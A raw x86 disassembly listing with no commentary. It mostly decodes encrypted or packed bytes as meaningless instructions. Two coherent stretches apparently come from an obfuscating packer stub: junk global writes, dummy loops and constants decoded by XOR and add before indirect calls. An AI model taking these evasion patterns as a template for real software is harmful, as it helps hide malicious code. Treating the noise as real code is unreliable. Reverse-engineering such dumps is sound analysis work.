  405293:	imul   ebx,DWORD PTR [ecx+0xf34e81b],0x61103722
  40529d:	mov    bl,0xd
  40529f:	lahf   
  4052a0:	hlt    
  4052a1:	aad    0xf0
  4052a3:	mov    bh,0x5b
  4052a5:	inc    esp
  4052a6:	js     0x405229
  4052a8:	xchg   esp,eax
  4052a9:	addr16 mov eax,0x388f9b43
  4052af:	pop    edx
  4052b0:	sahf   
  4052b1:	xchg   edx,eax
  4052b2:	loopne 0x4052c8
  4052b4:	xor    eax,0x43d0e3d0
  4052b9:	pop    ebp
  4052ba:	retf   
  4052bb:	lahf   
  4052bc:	mov    edx,0x14325113
  4052c1:	pop    eax
  4052c2:	rcr    DWORD PTR [ecx+0x7d],0x9f
  4052c6:	mov    BYTE PTR [ecx],0x8a
  4052c9:	cmp    BYTE PTR [ebp-0x3fd89141],0x7e
  4052d0:	ins    BYTE PTR es:[edi],dx
  4052d1:	xchg   ebp,eax
  4052d2:	loope  0x405271
  4052d4:	nop
  4052d5:	adc    al,0x15
  4052d7:	bound  ebp,QWORD PTR [ebp+0xb]
  4052da:	in     al,dx
  4052db:	data16 jae 0x40535b
  4052de:	cmp    eax,0xa25c55aa
  4052e3:	mov    ah,0x2
  4052e5:	loopne 0x405285
  4052e7:	(bad)  
  4052e8:	sti    
  4052e9:	pop    edx
  4052ea:	aad    0xd8
  4052ec:	jle    0x4052e5
  4052ee:	imul   esi,DWORD PTR [ebp+0x45],0x39cc35e
  4052f5:	mov    edx,0xa57d9206
  4052fa:	icebp  
  4052fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052fc:	dec    edx
  4052fd:	adc    esp,DWORD PTR [ebx+0x1113c0de]
  405303:	lock fs inc ecx
  405306:	das    
  405307:	and    eax,0x2962a7fc
  40530c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40530d:	scas   al,BYTE PTR es:[edi]
  40530e:	sub    al,0x27
  405310:	shl    BYTE PTR [ecx],cl
  405312:	test   al,0x71
  405314:	cli    
  405315:	imul   ebp,edx,0x1a
  405318:	arpl   WORD PTR [eax],si
  40531a:	ret    0x334
  40531d:	repnz lock mov dl,0x89
  405321:	pop    ebp
  405322:	cmp    al,0x96
  405324:	inc    ecx
  405325:	out    0x3c,eax
  405327:	iret   
  405328:	xor    DWORD PTR [esi+ebx*1-0x263b63ef],edx
  40532f:	mov    ah,0xe4
  405331:	mov    BYTE PTR [ecx],al
  405333:	das    
  405334:	loope  0x4052d4
  405336:	(bad)  
  405337:	aad    0xb5
  405339:	mov    ah,0xa0
  40533b:	mov    ds:0x93ff46d4,eax
  405340:	xchg   edi,eax
  405341:	adc    al,0x2d
  405343:	mov    edi,0xe40908d9
  405348:	pop    esp
  405349:	inc    esp
  40534a:	xlat   BYTE PTR ds:[ebx]
  40534b:	push   ebx
  40534c:	mov    ch,0xba
  40534e:	mov    esp,0xef4e91eb
  405353:	cwde   
  405354:	push   esp
  405355:	bound  ebx,QWORD PTR [edi-0x36]
  405358:	add    ebx,ebx
  40535a:	enter  0xe806,0x91
  40535e:	loop   0x4052ec
  405360:	(bad)  
  405361:	lock mov BYTE PTR [esi+0x3109ec5e],bl
  405368:	clc    
  405369:	dec    edx
  40536a:	pop    eax
  40536b:	sbb    al,0x9c
  40536d:	pop    ecx
  40536e:	cld    
  40536f:	xor    eax,0x3e323579
  405374:	outs   dx,DWORD PTR ds:[esi]
  405375:	jae    0x4053c1
  405377:	je     0x4053b8
  405379:	sti    
  40537a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40537b:	call   0xc84a:0x454eca0
  405382:	scas   al,BYTE PTR es:[edi]
  405383:	sti    
  405384:	stos   DWORD PTR es:[edi],eax
  405385:	or     edx,DWORD PTR [eax-0x24f50770]
  40538b:	jge    0x4053b8
  40538d:	cdq    
  40538e:	add    esp,DWORD PTR [ecx-0x6b]
  405391:	or     ah,BYTE PTR [edx-0x37]
  405394:	enter  0x6081,0xe8
  405398:	out    0x99,eax
  40539a:	dec    ebp
  40539b:	out    0xc,al
  40539d:	mov    BYTE PTR [ebp+0x4f83bfee],ah
  4053a3:	cmp    DWORD PTR [edx],0x87924e8b
  4053a9:	and    eax,DWORD PTR [edi-0x54]
  4053ac:	sti    
  4053ad:	push   esi
  4053ae:	sub    BYTE PTR [esp+ecx*8-0x26],ch
  4053b2:	pop    edx
  4053b3:	(bad)  
  4053b4:	push   ds
  4053b5:	sbb    BYTE PTR [edx-0x14],0x63
  4053b9:	add    ebx,DWORD PTR [ecx+0x3d928982]
  4053bf:	pop    ecx
  4053c0:	pop    edx
  4053c1:	inc    edi
  4053c2:	mov    ebp,0x68b39d19
  4053c7:	sub    DWORD PTR [di],esi
  4053ca:	int3   
  4053cb:	or     al,0xc8
  4053cd:	mov    BYTE PTR [eax],bl
  4053cf:	mov    ebp,ss
  4053d1:	dec    esi
  4053d2:	out    dx,eax
  4053d3:	imul   edx,DWORD PTR [ebx+edx*8+0x22],0xffffff9d
  4053d8:	fwait
  4053d9:	in     eax,dx
  4053da:	push   0xffffffca
  4053dc:	add    dh,BYTE PTR [edi+0x6c]
  4053df:	jge    0x40544a
  4053e1:	ret    0xd8ff
  4053e4:	lds    edx,FWORD PTR [edx-0x6]
  4053e7:	mov    ?,ebp
  4053e9:	jne    0x405410
  4053eb:	sbb    eax,0x5bfed6ac
  4053f0:	in     al,0xc6
  4053f2:	inc    edx
  4053f3:	ins    BYTE PTR es:[edi],dx
  4053f4:	sbb    eax,0x80d827fb
  4053f9:	xchg   edx,eax
  4053fa:	ficom  WORD PTR [esi+0x66]
  4053fd:	int    0x62
  4053ff:	push   ss
  405400:	das    
  405401:	add    bl,BYTE PTR [esi]
  405403:	xchg   ebp,eax
  405404:	loope  0x405461
  405406:	imul   edi,eax,0x24
  405409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40540a:	add    eax,DWORD PTR [ebp+eiz*2+0x4ff1f500]
  405411:	mov    ah,BYTE PTR [edi-0x12924a16]
  405417:	pushf  
  405418:	sub    cl,BYTE PTR [eax]
  40541a:	retf   
  40541b:	jl     0x4053c0
  40541d:	bt     DWORD PTR [edx],ebx
  405420:	rcr    BYTE PTR [ebp+0x3c9b0c33],cl
  405426:	arpl   WORD PTR [edx],cx
  405428:	stos   DWORD PTR es:[edi],eax
  405429:	or     cl,bl
  40542b:	jno    0x405453
  40542d:	arpl   WORD PTR [ebp-0x11],bx
  405430:	call   0x47f7:0x8399f724
  405437:	pop    ss
  405438:	xchg   esi,eax
  405439:	cli    
  40543a:	fsubr  DWORD PTR [ebx+0x66]
  40543d:	imul   edi,eax,0x482f6b47
  405443:	push   cs
  405444:	add    esp,DWORD PTR [edi+0x3913372]
  40544a:	mov    eax,0x16e98522
  40544f:	sub    BYTE PTR [eax],dl
  405451:	test   DWORD PTR [esi+0x27040664],ebx
  405457:	mov    edi,0xe9c2e2a5
  40545c:	jecxz  0x4054d2
  40545e:	mov    bh,0x49
  405460:	sbb    eax,0xb6609d30
  405465:	inc    eax
  405466:	test   DWORD PTR ds:0x84f5772b,ebp
  40546c:	jg     0x4054bb
  40546e:	outs   dx,BYTE PTR ds:[esi]
  40546f:	push   ss
  405470:	(bad)  
  405472:	xor    BYTE PTR [ebp+0x6],ch
  405475:	data16 rol BYTE PTR [ecx-0x74f7bd77],1
  40547c:	inc    ebp
  40547d:	sbb    al,0x8b
  40547f:	push   ebp
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x77a2c60a
  4055e5:	dec    esi
  4055e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055e7:	(bad)  
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405644
  4055f1:	out    0xfa,al
  4055f3:	inc    esi
  4055f4:	xlat   BYTE PTR ds:[ebx]
  4055f5:	icebp  
  4055f6:	(bad)  
  4055f7:	jns    0x4055cb
  4055f9:	jnp    0x4055d6
  4055fb:	xor    al,0x16
  4055fd:	shl    BYTE PTR [ebx-0x5b],0x18
  405601:	shl    ebx,0xd2
  405604:	rol    DWORD PTR [ebx],1
  405606:	and    eax,0x18203ea1
  40560b:	pop    ss
  40560c:	ds mov dh,0x7b
  40560f:	stos   DWORD PTR es:[edi],eax
  405610:	out    dx,eax
  405611:	mov    ds:0xf3f1b4a7,al
  405616:	stos   DWORD PTR es:[edi],eax
  405617:	push   ds
  405618:	aad    0x55
  40561a:	pop    ebx
  40561b:	mov    ds:0xfe39829,al
  405620:	hlt    
  405621:	sub    al,0x8b
  405623:	mov    al,ds:0xb3cf87e7
  405628:	dec    edx
  405629:	sbb    dl,BYTE PTR ds:0xe39eb3a0
  40562f:	sbb    esi,edx
  405631:	mov    bl,cl
  405633:	mov    eax,DWORD PTR [edi+ebp*4+0x7c18836d]
  40563a:	scas   eax,DWORD PTR es:[edi]
  40563b:	mov    cl,0x1
  40563d:	add    ch,BYTE PTR [ecx+0x9c1e678]
  405643:	lea    ebp,[ecx-0x5404fd09]
  405649:	pop    esp
  40564a:	mov    al,0xdd
  40564c:	pusha  
  40564d:	dec    edx
  40564e:	(bad)  [edi+0x5f6c27b6]
  405654:	std    
  405655:	jle    0x4056d6
  405657:	xor    al,0x73
  405659:	in     eax,0x54
  40565b:	cs push ecx
  40565d:	mov    esi,0xa1c3147a
  405662:	invd   
  405664:	fild   QWORD PTR [ebp+0x5b21899c]
  40566a:	sub    bh,dh
  40566c:	not    dh
  40566e:	dec    ebp
  40566f:	jbe    0x4056b5
  405671:	pop    ebp
  405672:	call   0xd6e:0x2312f3f9
  405679:	push   ss
  40567a:	sbb    dh,BYTE PTR [ecx]
  40567c:	sub    DWORD PTR [ecx-0x1af36c03],0x6
  405683:	dec    esi
  405684:	jb     0x4056cb
  405686:	rcl    DWORD PTR [edx+ebp*1],0x51
  40568a:	mov    ah,0x34
  40568c:	add    al,0xe4
  40568e:	mov    DWORD PTR [eax-0x45],0x33b59bfc
  405695:	mov    ch,BYTE PTR ds:0x94e75358
  40569b:	push   esp
  40569c:	clc    
  40569d:	fs pop ecx
  40569f:	icebp  
  4056a0:	int3   
  4056a1:	(bad)  
  4056a3:	jae    0x405703
  4056a5:	out    0x8d,eax
  4056a7:	iret   
  4056a8:	stos   BYTE PTR es:[edi],al
  4056a9:	pop    eax
  4056aa:	hlt    
  4056ab:	repz fbld TBYTE PTR gs:[esi]
  4056af:	mov    edx,0x74eaf3d5
  4056b4:	rcr    BYTE PTR [ebp+0x1e25e69],0x3d
  4056bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bc:	das    
  4056bd:	mov    cl,0xd8
  4056bf:	call   0x7aed9aa6
  4056c4:	ficomp WORD PTR [ecx-0x186378d9]
  4056ca:	mov    eax,DWORD PTR [eax+0x3a8f2aab]
  4056d0:	pop    ss
  4056d1:	les    edi,FWORD PTR [ebp+ebx*4-0x41]
  4056d5:	cmp    cl,BYTE PTR [edi+0x24bbe202]
  4056db:	jbe    0x405702
  4056dd:	inc    ebx
  4056de:	cli    
  4056df:	jg     0x405663
  4056e1:	jnp    0x405741
  4056e3:	outs   dx,BYTE PTR ds:[esi]
  4056e4:	dec    esi
  4056e5:	push   ss
  4056e6:	ja     0x40566c
  4056e8:	je     0x405698
  4056ea:	mov    ecx,0x13d15369
  4056ef:	aaa    
  4056f0:	loopne 0x405676
  4056f2:	lock adc edi,DWORD PTR ds:0xe8260bf4
  4056f9:	sbb    dh,BYTE PTR [eax+0x72]
  4056fc:	push   edx
  4056fd:	enter  0xd3a7,0x8a
  405701:	loopne 0x40576c
  405703:	scas   eax,DWORD PTR es:[edi]
  405704:	rol    DWORD PTR [eax+0x4b],1
  405707:	push   ds
  405708:	jg     0x4056c6
  40570a:	arpl   WORD PTR [ebx-0x63e034e2],dx
  405710:	add    eax,0xfab7ef3a
  405715:	mov    cl,dh
  405717:	imul   ecx,DWORD PTR [esi+esi*4],0x5e97cc1c
  40571e:	dec    edx
  40571f:	sub    bh,bh
  405721:	in     eax,0x2f
  405723:	dec    esi
  405724:	mov    edx,cs
  405726:	ret    0xbe6c
  405729:	dec    ecx
  40572a:	std    
  40572b:	jle    0x4056af
  40572d:	(bad)  
  40572e:	or     eax,0x13c5809e
  405733:	and    al,0x4d
  405735:	mov    eax,0xf6b4cd8
  40573a:	stc    
  40573b:	mov    ebp,0x33f44fe4
  405740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405741:	mov    al,ds:0x6e001a3b
  405746:	sti    
  405747:	rcl    DWORD PTR [edi-0x2a83a702],0xcb
  40574e:	push   edi
  40574f:	xchg   ebp,eax
  405750:	push   edx
  405751:	lods   al,BYTE PTR ds:[esi]
  405752:	scas   eax,DWORD PTR es:[edi]
  405753:	je     0x405752
  405755:	xor    BYTE PTR [ecx-0x210aea5e],dh
  40575b:	inc    ebp
  40575c:	iret   
  40575d:	test   DWORD PTR [ebx],ebp
  40575f:	mov    bl,0x88
  405761:	mov    al,ds:0x9cd0d273
  405766:	iret   
  405767:	hlt    
  405768:	push   esp
  405769:	xchg   ebx,eax
  40576a:	(bad)  
  40576b:	fdiv   QWORD PTR [eax]
  40576d:	inc    esp
  40576e:	push   ds
  40576f:	cs inc esp
  405771:	pop    edi
  405772:	cdq    
  405773:	inc    edi
  405774:	inc    ebp
  405775:	and    BYTE PTR [ebx+0x1ea77ced],bl
  40577b:	stc    
  40577c:	cmp    DWORD PTR [ebp+0x4d],ecx
  40577f:	jne    0x40573d
  405781:	or     eax,0x6de347fd
  405786:	cmp    DWORD PTR [ebp+0x74],eax
  405789:	push   esi
  40578a:	mov    ebx,0x696eaec4
  40578f:	aam    0x47
  405791:	cli    
  405792:	adc    dh,bh
  405794:	mov    BYTE PTR [edi],ah
  405796:	sub    BYTE PTR [edi-0x4da67909],bh
  40579c:	pop    edi
  40579d:	pop    ss
  40579e:	outs   dx,BYTE PTR ds:[esi]
  40579f:	in     eax,dx
  4057a0:	cld    
  4057a1:	ret    0x6705
  4057a4:	int3   
  4057a5:	jne    0x4057f5
  4057a7:	(bad)  
  4057a8:	fcom   DWORD PTR [edx-0x5b]
  4057ab:	jns    0x4057fe
  4057ad:	sub    BYTE PTR [ebx-0x7ca73455],dl
  4057b3:	(bad)  
  4057b4:	call   0x614fe19c
  4057b9:	(bad)  
  4057ba:	push   ebp
  4057bb:	in     al,dx
  4057bc:	das    
  4057bd:	imul   DWORD PTR [ebx-0x753f977b]
  4057c3:	inc    edx
  4057c4:	fmul   QWORD PTR [ecx-0x615b0c99]
  4057ca:	push   ecx
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42ec5b,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	aad    0x84
  4059a4:	xchg   ecx,eax
  4059a5:	das    
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x405a0e
  4059af:	xor    BYTE PTR [ecx],al
  4059b1:	icebp  
  4059b2:	pop    esp
  4059b3:	out    dx,eax
  4059b4:	sti    
  4059b5:	inc    esp
  4059b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059b7:	jnp    0x40595d
  4059b9:	jle    0x405a1e
  4059bb:	dec    edx
  4059bc:	shl    DWORD PTR [eax],1
  4059be:	jp     0x405950
  4059c0:	aas    
  4059c1:	dec    eax
  4059c2:	mov    ecx,0x65516bf9
  4059c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059c8:	(bad)
  4059cb:	ds retf 
  4059cd:	stos   BYTE PTR es:[edi],al
  4059ce:	loop   0x4059e0
  4059d0:	pop    ss
  4059d1:	or     BYTE PTR [eax],bl
  4059d3:	call   0x2fb0841c
  4059d8:	adc    ebx,DWORD PTR [ebp-0x1f]
  4059db:	xor    al,0xc
  4059dd:	enter  0x265f,0xf5
  4059e1:	xchg   ecx,eax
  4059e2:	add    al,0xe7
  4059e4:	aad    0xc9
  4059e6:	ja     0x405a4f
  4059e8:	and    al,0x5d
  4059ea:	mov    esi,0x8df6ea25
  4059ef:	xor    dl,BYTE PTR [edi+0x7c]
  4059f2:	push   eax
  4059f3:	ins    DWORD PTR es:[edi],dx
  4059f4:	push   ebp
  4059f5:	mov    al,0xe4
  4059f7:	mov    dh,0xa4
  4059f9:	pop    esi
  4059fa:	adc    eax,ecx
  4059fc:	mov    ebp,0xf9ff3c5b
  405a01:	shl    BYTE PTR [esp+esi*8-0x12f7983b],1
  405a08:	pop    ecx
  405a09:	push   ebx
  405a0a:	in     eax,dx
  405a0b:	out    0xa9,al
  405a0d:	adc    DWORD PTR [esi],ecx
  405a0f:	xlat   BYTE PTR ds:[ebx]
  405a10:	(bad)  
  405a12:	test   al,0x37
  405a14:	pop    ebx
  405a15:	xchg   esp,eax
  405a16:	xor    eax,DWORD PTR [eax-0xc]
  405a19:	xchg   ecx,eax
  405a1a:	adc    eax,0x2e5f024d
  405a1f:	jmp    eax
  405a21:	cmp    DWORD PTR [ebx-0x4aa816ff],0xc7afc266
  405a2b:	jge    0x4059ed
  405a2d:	jnp    0x4059c0
  405a2f:	popf   
  405a30:	xor    eax,0x902c0431
  405a35:	rcl    esp,0xee
  405a38:	jl     0x4059bb
  405a3a:	sbb    al,0x76
  405a3c:	mov    ebp,0x51ce7d7
  405a41:	mov    cl,0xa1
  405a43:	adc    BYTE PTR [edx],bh
  405a45:	fdiv   st(5),st
  405a47:	pop    eax
  405a48:	rol    DWORD PTR [edx],0xee
  405a4b:	ficom  DWORD PTR [eax+0x1488ae87]
  405a51:	movd   DWORD PTR [esi+edx*8+0x37],mm0
  405a56:	out    dx,eax
  405a57:	pop    esp
  405a58:	into   
  405a59:	dec    edx
  405a5a:	jo     0x405a62
  405a5c:	jo     0x405ac2
  405a5e:	lods   eax,DWORD PTR ds:[esi]
  405a5f:	and    BYTE PTR [ebp-0x7f],cl
  405a62:	gs pop esi
  405a64:	cdq    
  405a65:	jo     0x405a3a
  405a67:	jo     0x405ab0
  405a69:	xor    esp,DWORD PTR [ebp-0x36]
  405a6c:	jmp    FWORD PTR [esi+0x4ce59654]
  405a72:	cmp    eax,0x91fba04c
  405a77:	push   cs
  405a78:	pop    ss
  405a79:	sub    cl,dh
  405a7b:	fst    DWORD PTR [ebx-0x2f]
  405a7e:	dec    ecx
  405a7f:	sub    cl,BYTE PTR [ebx-0x6]
  405a82:	lds    edi,FWORD PTR [edi-0x4928d9e2]
  405a88:	ret    
  405a89:	add    ah,BYTE PTR [edi+ebx*1]
  405a8c:	xchg   ebx,eax
  405a8d:	aad    0xe1
  405a8f:	int3   
  405a90:	mov    esi,0x7f543a98
  405a95:	pop    eax
  405a96:	dec    ecx
  405a97:	repnz xchg edx,eax
  405a99:	mov    bh,0x17
  405a9b:	jno    0x108f31c0
  405aa1:	inc    ebp
  405aa2:	cld    
  405aa3:	call   0xd468:0x4dc6cb4a
  405aaa:	mov    eax,0x52afa9d0
  405aaf:	cmp    BYTE PTR [edi+0x68],ah
  405ab2:	sbb    BYTE PTR [ebp-0x3d310ef8],ah
  405ab8:	sbb    eax,0x9171d1dc
  405abd:	add    DWORD PTR [edi+0x37a1bdaf],edx
  405ac3:	stos   BYTE PTR es:[edi],al
  405ac4:	jmp    0x405abd
  405ac6:	push   ds
  405ac7:	test   bh,cl
  405ac9:	push   cs
  405aca:	and    BYTE PTR [eax+edi*2],bl
  405acd:	xlat   BYTE PTR ds:[ebx]
  405ace:	xchg   esi,eax
  405acf:	add    DWORD PTR [edx],0xfffffffb
  405ad2:	loopne 0x405ae3
  405ad4:	mov    BYTE PTR [edi+0x21],al
  405ad7:	sub    ecx,esi
  405ad9:	xor    al,0x7e
  405adb:	aas    
  405adc:	fdivr  st(4),st
  405ade:	js     0x405a8a
  405ae0:	mov    ds:0xa0e67379,eax
  405ae5:	or     eax,0x9442dbee
  405aea:	sbb    BYTE PTR [ecx],al
  405aec:	mov    esp,eax
  405aee:	pop    eax
  405aef:	js     0x405ad3
  405af1:	jmp    0xa36f:0x347acf41
  405af8:	or     DWORD PTR [edi+0x1],0xa
  405afc:	or     eax,0x952275d8
  405b01:	cmp    BYTE PTR [ecx],dl
  405b03:	jge    0x405aeb
  405b05:	adc    bl,BYTE PTR [edx-0x5c]
  405b08:	or     eax,DWORD PTR [edi+0x57bb50b2]
  405b0e:	jb     0x405aef
  405b10:	fistp  DWORD PTR [esp+ebx*2-0x3d53bea1]
  405b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b18:	cdq    
  405b19:	or     BYTE PTR [edx],ah
  405b1b:	ins    BYTE PTR es:[edi],dx
  405b1c:	sub    DWORD PTR [esi],ebp
  405b1e:	mov    esp,0xfd45d633
  405b23:	in     al,0x52
  405b25:	adc    al,0xd4
  405b27:	inc    edi
  405b28:	mov    edi,0xb20c3508
  405b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b2e:	int    0x94
  405b30:	daa    
  405b31:	fcmovbe st,st(1)
  405b33:	lea    esi,[ebx-0x4a]
  405b36:	rcl    DWORD PTR [ecx],0x86
  405b39:	rcl    DWORD PTR [eax],1
  405b3b:	ins    BYTE PTR es:[edi],dx
  405b3c:	mov    bh,dl
  405b3e:	pop    ebx
  405b3f:	inc    ebp
  405b40:	pop    esp
  405b41:	icebp  
  405b42:	outs   dx,DWORD PTR ds:[esi]
  405b43:	jnp    0x405bb2
  405b45:	stos   BYTE PTR es:[edi],al
  405b46:	pop    ebx
  405b47:	xor    esi,DWORD PTR [edi]
  405b49:	int3   
  405b4a:	xchg   ebp,eax
  405b4b:	cli    
  405b4c:	sbb    ah,BYTE PTR [ebx+0x44]
  405b4f:	jo     0x405b26
  405b51:	mov    edx,0x76d24fea
  405b56:	stc    
  405b57:	popa   
  405b58:	xor    DWORD PTR ds:[edi+0x60a05d21],ecx
  405b5f:	add    ebp,0x1c
  405b62:	mov    ebx,0xd92a8a8b
  405b67:	stc    
  405b68:	jp     0x405af5
  405b6a:	cmc    
  405b6b:	imul   edi,DWORD PTR [edi-0x2f],0xee6c7acd
  405b72:	call   FWORD PTR [edi-0x2223d1fe]
  405b78:	push   es
  405b79:	sar    BYTE PTR [edi+0x4051c8ef],0xf4
  405b80:	inc    ebp
